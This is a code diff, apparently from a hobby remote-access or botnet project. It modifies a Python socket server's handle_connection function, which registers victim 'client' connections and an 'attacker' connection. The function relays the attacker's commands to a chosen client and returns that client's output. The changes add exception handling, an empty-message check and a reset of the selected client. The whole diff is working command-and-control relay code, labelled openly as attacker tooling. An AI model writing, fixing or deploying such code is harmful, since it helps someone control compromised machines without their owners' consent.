@@ -19,54 +19,60 @@ server.bind(ADDR)
 
 
 def handle_connection(conn, addr):
-    global attacker
-    global client
-    global clients
-    global selectedclient
-    global clientnum
-    global messageA
-    global messageC
-    i = 0
-    loop = False
-    while True:
-        msg = conn.recv(HEADER).decode(FORMAT)
-        if msg:
-            loop = True
-        while loop:
-            if "<?CLIENT?>" in msg:
-                clientnum, messageC = str(msg).split("<?CLIENT?>")
-                if i == 0:
-                    clients.append((clientnum, addr, conn))
-                    print(str(addr) + ":" + clientnum + " client connected")
-                i = 1
-                if selectedclient:
-                    for c in clients:
-                        if c[1] == addr:
-                            if c[0] == selectedclient:
-                                print("client: " + messageC)
-                                attacker[0].send(messageC.encode(FORMAT))
-                                messageC = ""
-                                loop = False
+    try:
+        global attacker
+        global client
+        global clients
+        global selectedclient
+        global clientnum
+        global messageA
+        global messageC
+        i = 0
+        loop = False
+        while True:
+            msg = conn.recv(HEADER).decode(FORMAT)
+            if msg:
+                loop = True
+            while loop:
+                if "<?CLIENT?>" in msg:
+                    clientnum, messageC = str(msg).split("<?CLIENT?>")
+                    if i == 0:
+                        clients.append((clientnum, addr, conn))
+                        print(str(addr) + ":" + clientnum + " client connected")
+                    i = 1
+                    if selectedclient:
+                        for c in clients:
+                            if c[1] == addr:
+                                if c[0] == selectedclient:
+                                    print("client: " + messageC)
+                                    if messageC:
+                                        print("send to attacker")
+                                        attacker[0].send(messageC.encode(FORMAT))
+                                        messageC = ""
+                                    selectedclient = ""
+                                    loop = False
+                                else:
+                                    loop = False
                             else:
                                 loop = False
-                        else:
-                            loop = False
+                    else:
+                        loop = False
                 else:
                     loop = False
-            else:
-                loop = False
 
-        if "<?ATTACKER?>" in msg:
-            attacker = conn, addr
-            while True:
-                selectedclient, messageA = str(msg).split("<?ATTACKER?>")
-                if clients:
-                    print("attacker: " + messageA)
-                    for c in clients:
-                        if c[0] == selectedclient:
-                            c[2].send(messageA.encode(FORMAT))
-                    messageA = ""
-                    break
+            if "<?ATTACKER?>" in msg:
+                attacker = conn, addr
+                while True:
+                    selectedclient, messageA = str(msg).split("<?ATTACKER?>")
+                    if clients:
+                        print("attacker: " + messageA)
+                        for c in clients:
+                            if c[0] == selectedclient:
+                                c[2].send(messageA.encode(FORMAT))
+                        messageA = ""
+                        break
+    except:
+        clients = []
 
 
 def start():
